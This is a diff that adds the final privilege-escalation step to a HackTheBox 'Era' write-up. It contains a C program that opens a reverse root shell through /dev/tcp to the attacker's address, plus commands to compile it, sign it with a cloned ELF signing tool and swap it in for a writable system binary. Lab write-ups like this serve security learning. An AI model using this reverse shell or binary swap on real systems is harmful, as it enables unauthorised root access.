@@ -76,5 +76,38 @@ So there was a binary called monitor that was writable. Interesting 🤔.
 ***NOTE: From here on out I had a LOT of help to figure this part out since its completely new to me***
 
 <!--I used this writeup https://lazyhackers.in/posts/era-htb-writeup-hackthebox-season-8-->
+<!--https://insidepwn.com/hackthebox-era-walkthrough-->
 
 Now I know a couple of classic ways to exploit writable binaries, but they didnt work. Instead what I found was that this binary was to be signed using specific keys which we can find in signing.zip
+
+So what we can do is this:
+
+1. Create an exploit.c file containing this:
+```c
+int main() {
+    setuid(0); setgid(0);
+    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.xx.xx/1337 0>&1", NULL);
+    return 0;
+}
+```
+2. Compile it using this: 
+```bash
+gcc -o monitor exploit.c -static
+```
+
+3. Use these commands to setup the tool to sign the malicious binary:
+```bash
+git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git
+cd linux-elf-binary-signer
+make clean
+gcc -o elf-sign elf_sign.c -lssl -lcrypto -Wno-deprecated-declarations
+```
+
+4. Download this binary, replacing the original monitor binary on the target machine.
+
+5. Start a listener on port 1337 of your kali linux and run this binary on your target machine. It will give root shell.
+
+## Final Thoughts
+Learned lots of new things on this machine. Hope to keep cooking with the next one. Since this season had a majority of windows machines I didnt grind it as much as i should have, will cook from next season.
+
+Bye :)
